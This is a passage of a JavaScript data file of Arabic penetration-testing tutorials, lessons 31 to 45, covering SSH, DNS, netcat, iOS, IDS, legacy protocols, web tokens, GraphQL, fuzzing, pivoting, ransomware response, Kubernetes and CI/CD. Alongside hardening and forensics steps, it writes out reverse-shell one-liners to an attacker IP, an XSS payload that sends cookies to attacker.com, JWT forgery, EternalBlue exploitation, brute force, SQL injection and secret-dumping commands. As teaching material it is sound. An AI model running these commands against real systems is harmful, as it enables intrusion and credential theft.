// ============================================================
// TUTORIALS EXTRA 2 — Lessons 31–60
// ============================================================
const TUTORIALS_EXTRA2 = [
{id:31,title:'أمان الـ SSH المتقدم',icon:'🔑',level:'intermediate',cat:'network',
 tags:['SSH','Hardening','Port Forwarding'],
 desc:'تأمين SSH بالكامل وإعداد tunneling وإدارة المفاتيح باحتراف.',
 steps:[
  {title:'توليد مفاتيح SSH قوية',text:'ed25519 أقوى وأسرع من RSA. استخدمه دائماً لتوليد مفاتيح جديدة.',cmd:'ssh-keygen -t ed25519 -C "admin@server" -f ~/.ssh/id_ed25519\nssh-copy-id -i ~/.ssh/id_ed25519.pub user@server',cmdDesc:'توليد مفتاح ed25519 ونسخه للخادم'},
  {title:'تقوية إعدادات sshd_config',text:'تعطيل دخول root، تغيير المنفذ، تحديد المستخدمين المسموح لهم.',cmd:'sudo nano /etc/ssh/sshd_config\n# PermitRootLogin no\n# PasswordAuthentication no\n# Port 2222\n# AllowUsers admin\nsudo systemctl restart sshd',cmdDesc:'تصليب إعدادات OpenSSH',note:'غيّر المنفذ في الجدار الناري أيضاً.'},
  {title:'SSH Port Forwarding - Local',text:'Local forwarding يوجّه منفذاً محلياً لخادم بعيد عبر SSH tunnel.',cmd:'ssh -L 8080:internal-server:80 user@jump-host\n# الآن http://localhost:8080 يصل لـ internal-server:80',cmdDesc:'Local Port Forwarding عبر SSH'},
  {title:'SSH Dynamic Forwarding - SOCKS5',text:'يحول SSH لـ SOCKS5 proxy يمرر كل الحركة.',cmd:'ssh -D 1080 user@server\n# ثم اضبط Firefox: SOCKS5 proxy → localhost:1080',cmdDesc:'SSH كـ SOCKS5 Proxy'},
  {title:'فحص أمان SSH بـ ssh-audit',text:'ssh-audit يفحص إعدادات SSH ويكشف الخوارزميات الضعيفة.',cmd:'pip install ssh-audit\nssh-audit server_ip\nssh-audit server_ip -p 2222',cmdDesc:'تدقيق إعدادات أمان SSH'}
 ]
},
{id:32,title:'اختبار أمان الـ DNS',icon:'🌐',level:'intermediate',cat:'network',
 tags:['DNS','Zone Transfer','Subdomain'],
 desc:'اكتشاف ثغرات DNS من Zone Transfer إلى DNS Cache Poisoning.',
 steps:[
  {title:'استطلاع DNS الكامل',text:'جمع جميع سجلات DNS الممكنة باستخدام أدوات متعددة.',cmd:'dig @8.8.8.8 target.com ANY\nhost -t any target.com\nnslookup -type=ANY target.com\nfierce --domain target.com',cmdDesc:'استخراج جميع سجلات DNS'},
  {title:'Zone Transfer Attack',text:'Zone Transfer يعطي قائمة كاملة بجميع السجلات. إذا لم يكن محمياً فهو ثغرة خطيرة.',cmd:'dig axfr @ns1.target.com target.com\nhost -l target.com ns1.target.com\ndnsenum target.com',cmdDesc:'محاولة Zone Transfer على DNS Server',note:'Zone Transfer يجب أن يكون مقيداً على DNS servers موثوقة فقط.'},
  {title:'اكتشاف الـ Subdomains بالقوة',text:'wordlist-based enumeration للعثور على نطاقات فرعية مخفية.',cmd:'gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\ndnsrecon -d target.com -D subdomains.txt -t brt',cmdDesc:'اكتشاف Subdomains بالـ Brute Force'},
  {title:'فحص DNS Misconfigurations',text:'wildcards وdangling DNS records من أخطر مشاكل DNS.',cmd:'dnsrecon -d target.com -t std,axfr,rvl,snoop\nnmap --script dns-zone-transfer,dns-brute target.com',cmdDesc:'فحص شامل لإعدادات DNS'},
  {title:'DNS Cache Poisoning Test',text:'اختبار إذا كان DNS server عرضة للـ Cache Poisoning.',cmd:'dnschef --fakedomains target.com --fakeip 192.168.1.5\n# أو اختبار DNSSEC:\ndig +dnssec target.com',cmdDesc:'اختبار DNS Cache Poisoning وDNSSEC'}
 ]
},
{id:33,title:'Netcat والـ Reverse Shells',icon:'🐱',level:'intermediate',cat:'exploitation',
 tags:['Netcat','Reverse Shell','Bind Shell'],
 desc:'إتقان Netcat لإنشاء اتصالات shells وضغط الملفات ونقل البيانات.',
 steps:[
  {title:'Netcat - الأوامر الأساسية',text:'Netcat هو السكين السويسري للشبكات. اتصال TCP/UDP، نقل ملفات، مسح منافذ.',cmd:'nc target.com 80\n# مسح منافذ:\nnc -zv target.com 20-100\n# Banner Grabbing:\necho "" | nc -w1 target.com 22',cmdDesc:'أوامر Netcat الأساسية'},
  {title:'Reverse Shell بـ Netcat',text:'الضحية تتصل بجهازك (outbound). تتجاوز بعض الجدران النارية.',cmd:'# على جهازك (listener):\nnc -lvnp 4444\n# على الضحية:\nnc attacker_ip 4444 -e /bin/bash\n# بديل بدون -e:\nbash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"',cmdDesc:'إعداد Reverse Shell عبر Netcat'},
  {title:'Bind Shell',text:'الضحية تنتظر الاتصال (inbound). الجهاز المهاجم يتصل بها.',cmd:'# على الضحية:\nnc -lvnp 4444 -e /bin/bash\n# على جهازك:\nnc victim_ip 4444',cmdDesc:'إعداد Bind Shell'},
  {title:'نقل الملفات بـ Netcat',text:'Netcat يمكنه نقل ملفات بين أجهزة بسرعة.',cmd:'# على المستقبل:\nnc -lvnp 9999 > received_file.txt\n# على المرسل:\nnc receiver_ip 9999 < file_to_send.txt\n# نقل مجلد كامل:\ntar czf - /folder | nc receiver_ip 9999',cmdDesc:'نقل الملفات عبر Netcat'},
  {title:'Upgraded Shell - TTY كامل',text:'بعد الحصول على shell، رقّيه لـ TTY كامل لدعم Tab completion وCtrl+C.',cmd:'python3 -c "import pty; pty.spawn(\'/bin/bash\')"\n# ثم:\nexport TERM=xterm\n# Ctrl+Z\nstty raw -echo; fg',cmdDesc:'ترقية Shell لـ TTY كامل',note:'هذا ضروري لاستخدام أدوات مثل vim ومحررات النصوص.'}
 ]
},
{id:34,title:'تحليل تطبيقات iOS',icon:'🍎',level:'advanced',cat:'mobile',
 tags:['iOS','IPA','Objection','Frida'],
 desc:'اختبار أمان تطبيقات iOS من تحليل IPA إلى تجاوز Jailbreak Detection.',
 steps:[
  {title:'إعداد بيئة اختبار iOS',text:'تحتاج iPhone/iPad مع Jailbreak أو استخدام Corellium لبيئة افتراضية.',cmd:'# تثبيت Objection:\npip3 install objection\n# تثبيت Frida server على الجهاز:\ncydia: install openssh\nscp frida-server root@device:/usr/bin/\nssh root@device "chmod +x /usr/bin/frida-server && frida-server &"',cmdDesc:'إعداد بيئة اختبار iOS'},
  {title:'تحليل IPA ثابت',text:'استخرج IPA وحلل المحتوى: Mach-O binary, plist files, resources.',cmd:'unzip app.ipa -d app_extracted/\nfind app_extracted/ -name "*.plist" | xargs plutil -p\nstrings app_extracted/Payload/App.app/App | grep -i "http\|api\|key\|secret\|password"',cmdDesc:'تحليل ملفات IPA'},
  {title:'Objection لاختبار ديناميكي',text:'Objection يحقن Frida ويوفر واجهة سهلة لاختبار التطبيق.',cmd:'objection -g com.example.app explore\n# في objection console:\nios keychain dump\nios nsuserdefaults get\nios sslpinning disable\nios jailbreak simulate',cmdDesc:'استخدام Objection'},
  {title:'تجاوز SSL Pinning في iOS',text:'Frida script لتجاوز SSL Pinning في iOS.',cmd:'frida -U -n "App Name" -l ios-ssl-pinning-bypass.js\n# أو بـ objection:\nobjection -g com.example.app explore\n# ثم: ios sslpinning disable',cmdDesc:'تجاوز SSL Pinning'},
  {title:'Keychain Dumping',text:'iOS Keychain قد يحتوي passwords وtokens وmAPI keys.',cmd:'objection -g com.example.app explore\n# في objection:\nios keychain dump\n# أو بـ Frida script:\nfrida -U -n "App" -l keychain-dumper.js',cmdDesc:'استخراج بيانات Keychain'}
 ]
},
{id:35,title:'تحليل حركة الشبكة بالذكاء',icon:'📊',level:'intermediate',cat:'network',
 tags:['Zeek','Snort','IDS','Network Forensics'],
 desc:'مراقبة وتحليل الشبكة باستخدام IDS/IPS وأدوات Network Forensics.',
 steps:[
  {title:'Snort IDS - الأساسيات',text:'Snort أشهر IDS مفتوح المصدر. يكتشف التهديدات بناءً على قواعد.',cmd:'apt install snort\nsnort -A console -q -c /etc/snort/snort.conf -i eth0\n# اختبار:\nsnort -T -c /etc/snort/snort.conf',cmdDesc:'تشغيل Snort IDS'},
  {title:'Zeek لتحليل الشبكة',text:'Zeek (Bro) يسجل حركة الشبكة بصيغة JSON قابلة للتحليل.',cmd:'apt install zeek\nzeek -i eth0 -C local\n# أو على PCAP:\nzeek -r capture.pcap\ncat conn.log | zeek-cut id.orig_h id.resp_h service',cmdDesc:'تحليل الشبكة بـ Zeek'},
  {title:'NetworkMiner للتحليل الجنائي',text:'NetworkMiner يستخرج الملفات والصور والبيانات من PCAP تلقائياً.',cmd:'apt install networkminer\n# أو تشغيل مباشر:\nmono NetworkMiner.exe capture.pcap\n# على Linux بـ Wine:\nwine NetworkMiner.exe',cmdDesc:'تحليل PCAP بـ NetworkMiner'},
  {title:'Suricata IPS',text:'Suricata أسرع من Snort ويدعم Multi-threading. يمكن استخدامه كـ IPS.',cmd:'apt install suricata\nsuricata -c /etc/suricata/suricata.yaml -i eth0\nsuricata-update  # تحديث القواعد\ntail -f /var/log/suricata/fast.log',cmdDesc:'تشغيل Suricata IPS'},
  {title:'تحليل الـ Logs المتقدم',text:'ELK Stack لتجميع وتحليل logs الشبكة بشكل احترافي.',cmd:'# تثبيت Elasticsearch + Logstash + Kibana:\ndocker run -d -p 9200:9200 -p 5601:5601 sebp/elk\n# أرسل logs:\nfilebeat -c filebeat.yml -e',cmdDesc:'ELK Stack لتحليل Logs الشبكة'}
 ]
},
{id:36,title:'ثغرات البروتوكولات القديمة',icon:'📡',level:'advanced',cat:'network',
 tags:['SMB','FTP','Telnet','Legacy Protocols'],
 desc:'استغلال بروتوكولات قديمة مثل SMB وFTP وTelnet.',
 steps:[
  {title:'فحص SMB واستغلاله',text:'SMB ثغرات كثيرة: EternalBlue, SMBGhost, EternalRomance. الفحص أولاً.',cmd:'nmap --script=smb-vuln-ms17-010,smb-vuln-cve-2020-0796 -p 445 target\nsmbclient -L //target.com -N  # استعراض shares\nenum4linux target.com',cmdDesc:'فحص SMB للثغرات'},
  {title:'EternalBlue (MS17-010)',text:'EternalBlue أشهر ثغرة SMB تاريخياً. WannaCry وNotPetya استخدماها.',cmd:'msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target\nset LHOST your_ip\nrun',cmdDesc:'استغلال EternalBlue',note:'للبيئات المختبرية فقط - الأنظمة المحدّثة محمية.'},
  {title:'FTP Attacks',text:'Anonymous FTP، Brute Force، FTP Bounce، وrftp exploitation.',cmd:'nmap --script=ftp-anon,ftp-brute -p 21 target\n# دخول anonymous:\nftp target\nUsername: anonymous\nPassword: email@email.com\n# Brute Force:\nhydra -l admin -P rockyou.txt ftp://target',cmdDesc:'اختبار أمان FTP'},
  {title:'Telnet وRlogin',text:'Telnet يرسل البيانات بدون تشفير. اعترض الاعتماد بسهولة.',cmd:'nmap -sV -p 23 target\ntelnet target 23\n# التقاط credentials:\ntcpdump -i eth0 port 23 -A | grep -i "login\|password"',cmdDesc:'اعتراض بيانات Telnet'},
  {title:'SNMP Exploitation',text:'SNMP v1/v2 community strings "public" كثيراً ما تكون مفتوحة.',cmd:'nmap -sU --script=snmp-info -p 161 target\nonesixtyone -c /usr/share/doc/onesixtyone/dict.txt target\nsnmpwalk -v2c -c public target',cmdDesc:'استغلال SNMP المفتوح'}
 ]
},
{id:37,title:'هجمات على الـ Web Tokens',icon:'🎫',level:'advanced',cat:'web',
 tags:['JWT','OAuth','Session Hijacking'],
 desc:'هجمات متقدمة على أنظمة المصادقة: JWT وOAuth وSession Management.',
 steps:[
  {title:'JWT Algorithm Confusion',text:'تغيير alg من RS256 إلى HS256 مع استخدام المفتاح العام كـ secret.',cmd:'# فك تشفير JWT:\necho "eyJ..." | python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split(\'.\'); print(json.dumps(json.loads(base64.urlsafe_b64decode(parts[0]+\'==\').decode()),indent=2))"',cmdDesc:'تحليل JWT Header وPayload'},
  {title:'JWT None Algorithm',text:'بعض المكتبات تقبل alg:none وهو يتجاوز التحقق تماماً.',cmd:'# python:\nimport jwt\nforged = jwt.encode({"user":"admin","role":"superuser"},"",algorithm="none")\nprint(forged)\n# أو بـ jwt_tool:\npython3 jwt_tool.py TOKEN -X a',cmdDesc:'استغلال JWT None Algorithm'},
  {title:'OAuth CSRF Attack',text:'OAuth بدون state parameter عرضة لـ CSRF يسمح بربط حساب المهاجم.',cmd:'# اصطدم برابط OAuth callback:\nhttps://target.com/oauth/callback?code=ATTACKER_CODE&state=\n# إذا قُبل بدون state → ثغرة CSRF في OAuth',cmdDesc:'اختبار OAuth CSRF'},
  {title:'Session Fixation',text:'المهاجم يحدد session ID قبل تسجيل دخول الضحية.',cmd:'# 1. احصل على session ID قبل الدخول\n# 2. أرسل لينك للضحية: https://target.com/login;jsessionid=ATTACKER_SESSION\n# 3. بعد دخول الضحية، الـ session ينتمي للمهاجم',cmdDesc:'اختبار Session Fixation'},
  {title:'Cookie Theft عبر XSS',text:'XSS يسمح بسرقة cookies ومن ثم Session Hijacking.',cmd:'# payload XSS لسرقة cookie:\n# <script>document.location=\'http://attacker.com/steal?c=\'+document.cookie</script>\n# استقبال على server المهاجم:\nnc -lvnp 80\n# أو:\npython3 -m http.server 80',cmdDesc:'سرقة Session Cookie عبر XSS'}
 ]
},
{id:38,title:'اختبار أمان الـ GraphQL',icon:'🔷',level:'advanced',cat:'web',
 tags:['GraphQL','API','Introspection'],
 desc:'اكتشاف واستغلال ثغرات GraphQL APIs الشائعة.',
 steps:[
  {title:'Introspection Query',text:'Introspection يكشف هيكل الـ GraphQL schema كاملاً. كثيراً ما يُترك مفعلاً في production.',cmd:'curl -X POST http://target.com/graphql -H "Content-Type: application/json" -d "{\"query\":\"{__schema{types{name fields{name}}}}\"}"\n# أو استخدم GraphQL Voyager لعرض بصري',cmdDesc:'استخراج Schema بـ Introspection'},
  {title:'GraphQL IDOR',text:'تغيير ID في GraphQL queries للوصول لبيانات مستخدمين آخرين.',cmd:'curl -X POST http://target.com/graphql -H "Content-Type: application/json" -d "{\"query\":\"{user(id:2){id name email password}}\"}"\n# جرب: id:1, id:2, id:3...',cmdDesc:'اختبار IDOR في GraphQL'},
  {title:'Batch Query Attack',text:'GraphQL يدعم إرسال queries متعددة - يُستخدم لتجاوز Rate Limiting.',cmd:'curl -X POST http://target.com/graphql -d "[{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"pass1\\\"){token}}\"},{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"pass2\\\"){token}}\"}]"',cmdDesc:'Batch Queries لتجاوز Rate Limiting'},
  {title:'GraphQL Injection',text:'GraphQL يمكن أن يكون عرضاً لـ SQL Injection وNoSQL Injection.',cmd:'curl -X POST http://target.com/graphql -H "Content-Type: application/json" -d "{\"query\":\"{users(filter:\\\"admin\\\' OR 1=1--\\\"){id email}}\"}"\n# استخدم graphw00f لتحديد النوع:\npython3 graphw00f.py -d -t http://target.com/graphql',cmdDesc:'اختبار SQL/NoSQL Injection في GraphQL'},
  {title:'أدوات GraphQL Testing',text:'InQL وGraphQLmap وgraphw00f من أفضل أدوات اختبار GraphQL.',cmd:'pip install inql\ninql -t http://target.com/graphql\n# أو GraphQLmap:\npython3 graphqlmap.py -u http://target.com/graphql --introspection',cmdDesc:'أدوات اختبار GraphQL التلقائية'}
 ]
},
{id:39,title:'تطوير اختبارات Fuzzing احترافية',icon:'🎲',level:'advanced',cat:'exploitation',
 tags:['Fuzzing','AFL++','LibFuzzer','Bug Hunting'],
 desc:'بناء مشاريع Fuzzing احترافية للعثور على ثغرات في البرمجيات.',
 steps:[
  {title:'LibFuzzer - Fuzzing المدمج',text:'LibFuzzer يُبنى مباشرة في الكود. أسرع من AFL++ للمشاريع الكبيرة.',cmd:'cat > fuzz_target.c << EOF\n#include <stdint.h>\n#include <stddef.h>\nextern int vulnerable_func(const char *data, size_t size);\nint LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n  vulnerable_func((const char*)data, size);\n  return 0;\n}\nEOF\nclang -fsanitize=fuzzer,address fuzz_target.c -o fuzzer\n./fuzzer',cmdDesc:'بناء LibFuzzer Target'},
  {title:'AFL++ مع Address Sanitizer',text:'ASan يكشف memory corruption أثناء الـ fuzzing لتحديد مسار الـ crash بدقة.',cmd:'CC=afl-clang-fast CXX=afl-clang-fast++ CFLAGS="-fsanitize=address" ./configure\nmake\nafl-fuzz -i seeds/ -o findings/ ./target_binary @@',cmdDesc:'AFL++ مع ASan'},
  {title:'Fuzzing البروتوكولات',text:'boofuzz يفحص بروتوكولات الشبكة مثل HTTP وFTP وSMTP.',cmd:'pip install boofuzz\npython3 << EOF\nfrom boofuzz import *\ns = Session(target=Target(connection=TCPSocketConnection("target",21)))\ns.connect(s_get("user"))\ns.fuzz()\nEOF',cmdDesc:'Protocol Fuzzing بـ boofuzz'},
  {title:'تحليل نتائج Fuzzing',text:'triage وgdb لتحليل الـ crashes التي وجدها AFL++.',cmd:'# عرض نتائج AFL:\nafl-triage findings/crashes/ -- ./target_binary\n# تحليل crash:\ngdb ./target_binary\nrun < findings/crashes/id:000001\nbacktrace\ninfo registers',cmdDesc:'تحليل Crashes من AFL++'},
  {title:'Fuzzing APIs',text:'ffuf وrestler-fuzzer لـ fuzzing تلقائي على REST APIs.',cmd:'# ffuf API Fuzzing:\nffuf -u http://target.com/api/FUZZ -w api-wordlist.txt -mc 200,201,403\n# مع JSON body:\nffuf -u http://target.com/api/users -X POST -H "Content-Type: application/json" -d "{\"name\":\"FUZZ\"}" -w payloads.txt',cmdDesc:'Fuzzing على REST APIs'}
 ]
},
{id:40,title:'Pivoting والتحرك عبر الشبكات',icon:'🔀',level:'advanced',cat:'exploitation',
 tags:['Pivoting','Tunneling','Chisel','Proxychains'],
 desc:'تقنيات التنقل عبر الشبكات الداخلية بعد الوصول الأولي.',
 steps:[
  {title:'Proxychains للتوجيه',text:'Proxychains يمرر حركة الأدوات عبر SOCKS proxy. يستخدم مع SSH Dynamic Forwarding.',cmd:'# إعداد Proxychains:\ncat /etc/proxychains4.conf\n# آخر سطر: socks5 127.0.0.1 1080\n# استخدام:\nproxychains4 nmap -sT -Pn 10.10.10.5\nproxychains4 curl http://internal-server/',cmdDesc:'إعداد واستخدام Proxychains'},
  {title:'Chisel - TCP/UDP Tunneling',text:'Chisel يُنشئ tunnels عبر HTTP/HTTPS. مفيد لتجاوز الجدران النارية.',cmd:'# على جهازك (server):\n./chisel server --reverse --port 8080\n# على الضحية (client):\n./chisel client your_ip:8080 R:socks\n# ثم استخدم proxychains',cmdDesc:'إعداد Chisel Reverse SOCKS Tunnel'},
  {title:'Ligolo-ng للـ Pivoting',text:'Ligolo-ng أداة حديثة سريعة جداً للـ Pivoting. تعمل كـ VPN تقريباً.',cmd:'# على جهازك:\n./proxy -selfcert -laddr 0.0.0.0:11601\n# على الضحية:\n./agent -connect your_ip:11601 -ignore-cert\n# في Ligolo console:\ninterface create --name ligolo\ntunnel start --tun ligolo',cmdDesc:'إعداد Ligolo-ng للـ Network Pivoting'},
  {title:'SSH Pivoting متعدد المراحل',text:'Multi-hop SSH tunneling للوصول لشبكات متعددة الطبقات.',cmd:'# SSH عبر jump host:\nssh -J jump_host@ip target_host@ip\n# أو في ~/.ssh/config:\n# Host internal\n#   ProxyJump jumphost\n#   HostName internal_ip\nssh internal',cmdDesc:'Multi-hop SSH Tunneling'},
  {title:'Meterpreter Port Forwarding',text:'Meterpreter يدعم Port Forwarding بشكل مدمج.',cmd:'# في Meterpreter session:\nportfwd add -l 3389 -p 3389 -r internal_host\n# الآن RDP على localhost:3389 يصل لـ internal_host:3389\nportfwd list  # عرض القائمة',cmdDesc:'Port Forwarding عبر Meterpreter'}
 ]
},
{id:41,title:'أساسيات برامج الفدية Ransomware',icon:'💰',level:'advanced',cat:'forensics',
 tags:['Ransomware','Incident Response','Decryption'],
 desc:'فهم تقنيات Ransomware والاستجابة للحوادث والتعافي منها.',
 steps:[
  {title:'تحليل Ransomware ثابتاً',text:'strings وbinwalk لاستخراج مؤشرات Ransomware بدون تشغيله.',cmd:'strings ransomware_sample.exe | grep -i "encrypt\|bitcoin\|ransom\|tor\|onion\|extension"\nexiftool ransomware_sample.exe\n# فحص imports:\nobjdump -x ransomware_sample.exe | grep "Import\|CryptEncrypt\|CryptGenKey"',cmdDesc:'تحليل Ransomware بدون تشغيل'},
  {title:'Dynamic Analysis في Sandbox',text:'Cuckoo Sandbox لتحليل Ransomware وفهم سلوكه.',cmd:'cuckoo submit --package exe ransomware_sample.exe\n# أو Any.run (online sandbox)\n# راقب:\n# - الملفات المشفرة\n# - مفاتيح Registry\n# - اتصالات C2 الشبكية',cmdDesc:'تحليل Ransomware ديناميكياً'},
  {title:'استرداد المفاتيح من الذاكرة',text:'بعض Ransomwares الضعيفة تخزن مفاتيح التشفير في الذاكرة.',cmd:'# التقاط memory dump:\nvolatility3 -f memory.raw windows.dumpfiles\n# البحث عن مفاتيح:\nstrings memory.raw | grep -i "AES\|RSA\|BEGIN\|PRIVATE KEY"',cmdDesc:'محاولة استرداد مفاتيح التشفير'},
  {title:'استعادة الملفات بدون فدية',text:'أدوات إلغاء التشفير المتاحة مجاناً لبعض عائلات Ransomware.',cmd:'# تحقق من No More Ransom:\n# https://www.nomoreransom.org\n# أو استخدم Shadow Copies:\nvssadmin list shadows\n# استعادة ملف:\nwbadmin start recovery -version:...',cmdDesc:'استعادة الملفات من Shadow Copies'},
  {title:'الاستجابة للحوادث',text:'خطوات IR عند اكتشاف Ransomware على الشبكة.',cmd:'# 1. عزل الجهاز فوراً:\nnetsh interface set interface "LAN" disabled\n# 2. التقاط memory dump:\nwinpmem.exe memory.raw\n# 3. حفظ logs:\nwevtutil epl System system.evtx\nwevtutil epl Security security.evtx',cmdDesc:'خطوات الاستجابة لهجوم Ransomware'}
 ]
},
{id:42,title:'اختبار أمان Kubernetes المتقدم',icon:'☸️',level:'advanced',cat:'cloud',
 tags:['Kubernetes','K8s','Helm','RBAC'],
 desc:'فحص شامل لأمان Kubernetes من RBAC إلى Container Escape.',
 steps:[
  {title:'Kubeaudit لتدقيق K8s',text:'kubeaudit يفحص إعدادات Kubernetes الأمنية تلقائياً.',cmd:'kubectl apply -f https://raw.githubusercontent.com/Shopify/kubeaudit/master/k8s/namespace.yaml\n# أو محلياً:\nkubeaudit all --kubeconfig ~/.kube/config',cmdDesc:'تدقيق أمان Kubernetes بـ kubeaudit'},
  {title:'Kube-bench لـ CIS Benchmark',text:'kube-bench يفحص compliance مع CIS Kubernetes Benchmark.',cmd:'docker run --rm -v $(which kubectl):/usr/local/mount-from-host/bin/kubectl aquasec/kube-bench:latest\n# أو على الـ node مباشرة:\nkube-bench master --version 1.27',cmdDesc:'فحص CIS Benchmark بـ kube-bench'},
  {title:'RBAC Privilege Escalation',text:'صلاحيات RBAC الزائدة تسمح بـ privilege escalation.',cmd:'kubectl auth can-i --list\nkubectl auth can-i create pods --as=system:serviceaccount:default:default\n# استغلال verb: create pods:\nkubectl run attacker --image=alpine --restart=Never --env="NODE_IP=$(cat /etc/hosts | grep kubernetes | awk \'{print $1}\')"',cmdDesc:'اكتشاف RBAC Privilege Escalation'},
  {title:'فحص Secrets المكشوفة',text:'K8s Secrets قد تكون في YAML files أو environment variables.',cmd:'kubectl get secrets --all-namespaces -o yaml | grep -i "password\|token\|secret\|key" | base64 -d 2>/dev/null\nkubectl get configmaps --all-namespaces -o yaml | grep -i "password\|key"',cmdDesc:'البحث عن Secrets في K8s'},
  {title:'Network Policies Bypass',text:'بدون Network Policies يمكن أي Pod التواصل مع أي Pod آخر.',cmd:'kubectl get networkpolicies --all-namespaces\n# من داخل Pod:\ncurl http://other-service.other-namespace.svc.cluster.local\n# فحص شامل:\nkubectl run tmp --image=alpine --rm -it -- sh\nnmap -sT kubernetes.default.svc.cluster.local',cmdDesc:'اختبار Network Policies Bypass'}
 ]
},
{id:43,title:'OSCP Path - منهج الدراسة',icon:'🎯',level:'beginner',cat:'basics',
 tags:['OSCP','Certification','Study Plan'],
 desc:'خارطة طريق شاملة للحصول على شهادة OSCP في 6 أشهر.',
 steps:[
  {title:'الشهر الأول - أساسيات Linux والشبكات',text:'أساس متين في Linux وNetworking ضروري قبل البدء بالـ OSCP.',cmd:'# موارد مجانية:\n# - OverTheWire: Bandit wargame\n# - TryHackMe: Pre-Security Path\n# - HackTheBox: Starting Point\nbandit0@bandit.labs.overthewire.org -p 2220',cmdDesc:'موارد الشهر الأول'},
  {title:'الشهر الثاني - Web Application Attacks',text:'OWASP Top 10 عملياً على DVWA وWebGoat وJuice Shop.',cmd:'# تثبيت DVWA:\ndocker run -d -p 80:80 vulnerables/web-dvwa\n# WebGoat:\ndocker run -d -p 8080:8080 webgoat/webgoat\n# Juice Shop:\ndocker run -d -p 3000:3000 bkimminich/juice-shop',cmdDesc:'إعداد بيئة تدريب OWASP'},
  {title:'الشهر الثالث - Buffer Overflow',text:'OSCP يتطلب Buffer Overflow على Windows. تدرب على TryHackMe BOF.',cmd:'# TryHackMe: Buffer Overflow Prep Room\n# HackTheBox: Retired Easy machines\n# مثال عملي:\n./brainpan.exe &\ngdb ./brainpan.exe',cmdDesc:'تدريب Buffer Overflow'},
  {title:'الشهر الرابع - Active Directory',text:'AD هو 40% من OSCP الحديث. BloodHound وImpacket أساسيان.',cmd:'# مختبر AD محلي بـ Vagrant:\ngit clone https://github.com/Orange-Cyberdefense/GOAD.git\ncd GOAD && vagrant up\n# TryHackMe: Attacking Active Directory',cmdDesc:'إعداد مختبر Active Directory'},
  {title:'الشهر الخامس والسادس - Exam Prep',text:'HTB Pro Labs وOffSec PG Practice للتحضير الفعلي للامتحان.',cmd:'# موارد الامتحان:\n# - HTB Pro Labs: RastaLabs, Offshore\n# - OffSec Proving Grounds: PG Practice\n# - ippsec.rocks: بحث عن machines\n# وقت الامتحان: 23 ساعة و45 دقيقة',cmdDesc:'نصائح لامتحان OSCP',note:'يجب 70 نقطة من 100 للنجاح. وثّق كل خطواتك.'}
 ]
},
{id:44,title:'اختبار أمان الـ Blockchain',icon:'⛓️',level:'advanced',cat:'web',
 tags:['Blockchain','Smart Contracts','Solidity'],
 desc:'اكتشاف واستغلال ثغرات Smart Contracts على Ethereum.',
 steps:[
  {title:'أدوات فحص Smart Contracts',text:'Slither وMythril وRemix لتحليل عقود Solidity ثابتاً.',cmd:'pip install slither-analyzer\nslither contract.sol\n# Mythril:\ndocker run -v $(pwd):/tmp mythril/myth analyze /tmp/contract.sol\n# Remix IDE online:\n# remix.ethereum.org',cmdDesc:'تحليل Smart Contracts ثابتاً'},
  {title:'Reentrancy Attack',text:'أشهر ثغرة في Ethereum. استغلتها هجمة The DAO عام 2016.',cmd:'# Vulnerable contract:\n# function withdraw() { msg.sender.call.value(balances[msg.sender])();\n#   balances[msg.sender] = 0; }  // ← تحديث الرصيد بعد الإرسال!\n# Exploit contract:\n# fallback() { if(victim.balance > 0) victim.withdraw(); }',cmdDesc:'فهم Reentrancy Attack'},
  {title:'Integer Overflow/Underflow',text:'قبل Solidity 0.8.0 لم يكن هناك overflow protection افتراضي.',cmd:'# Vulnerable: uint8 balance = 0; balance -= 1; → 255!\n# أو: uint8 total = 255; total += 1; → 0!\n# اختبار:\nnpx hardhat test --network localhost',cmdDesc:'اختبار Integer Overflow في Solidity'},
  {title:'فحص بـ Echidna Fuzzer',text:'Echidna fuzzer مخصص لـ Smart Contracts يكتشف ثغرات تلقائياً.',cmd:'docker run -it -v $(pwd):/src trailofbits/eth-security-toolbox\ncd /src && echidna-test contract.sol --contract MyContract',cmdDesc:'Fuzzing على Smart Contracts بـ Echidna'},
  {title:'Front-Running Attack',text:'Miners يمكنهم مشاهدة transactions معلقة وتقديم transactions مربحة.',cmd:'# مراقبة mempool:\nweb3.eth.subscribe("pendingTransactions", (hash) => {\n  web3.eth.getTransaction(hash).then(tx => {\n    if(tx.to === "0xVulnerableContract") console.log("Front-run target:", tx);\n  });\n});',cmdDesc:'مفهوم Front-Running في Blockchain'}
 ]
},
{id:45,title:'أمان الـ DevOps وCI/CD',icon:'🔧',level:'intermediate',cat:'cloud',
 tags:['DevOps','CI/CD','Jenkins','GitHub Actions'],
 desc:'اكتشاف ثغرات في بيئات DevOps وCI/CD pipelines.',
 steps:[
  {title:'فحص Jenkins للثغرات',text:'Jenkins بدون تأمين مفتوح للجميع. CVE-2018-1000861 أشهر ثغراته.',cmd:'# Script Console بدون auth:\ncurl http://jenkins.target.com/script -d "script=println(\'id\'.execute().text)"\n# أو في MSF:\nuse exploit/multi/http/jenkins_script_console\nset RHOSTS target\nrun',cmdDesc:'استغلال Jenkins Script Console'},
  {title:'GitHub Actions Secrets Theft',text:'GitHub Actions workflows قد تكشف secrets أو تسمح بـ injection.',cmd:'# Workflow injection:\n# name: ${{ github.event.issue.title }} ← خطر!\n# اختبار:\ngit clone target_repo\ngrep -r "secrets\\." .github/workflows/',cmdDesc:'تحليل GitHub Actions للثغرات'},
  {title:'Docker Registries المكشوفة',text:'Docker Registries بدون auth تكشف images قد تحتوي secrets.',cmd:'curl http://registry.target.com/v2/_catalog\ncurl http://registry.target.com/v2/app/tags/list\ndocker pull registry.target.com/app:latest\ndocker run --rm -it registry.target.com/app:latest /bin/sh',cmdDesc:'فحص Docker Registry المكشوف'},
  {title:'Terraform State Files',text:'Terraform state يحتوي secrets وكلمات مرور بنص واضح.',cmd:'# في S3 bucket:\naws s3 ls s3://terraform-state-bucket/\naws s3 cp s3://terraform-state-bucket/terraform.tfstate .\njq ".resources[].instances[].attributes" terraform.tfstate | grep -i "password\|secret\|key"',cmdDesc:'استخراج Secrets من Terraform State'},
